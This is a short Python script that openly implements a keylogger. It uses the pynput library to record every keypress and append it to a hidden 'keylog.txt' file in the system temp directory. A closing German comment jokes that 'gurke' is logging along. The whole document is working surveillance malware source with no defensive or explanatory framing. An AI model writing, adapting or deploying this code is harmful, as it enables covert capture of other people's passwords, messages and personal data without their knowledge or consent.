import os
import tempfile
from pynput import keyboard

# Get the path to the temp directory
temp_dir = tempfile.gettempdir()
log_file = os.path.join(temp_dir, "keylog.txt")

# Function to handle key presses
def on_key_press(event):
    with open(log_file, "a") as f:
        f.write(str(event) + "\n")

# Start the keylogger
with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
# gurke loggt mit.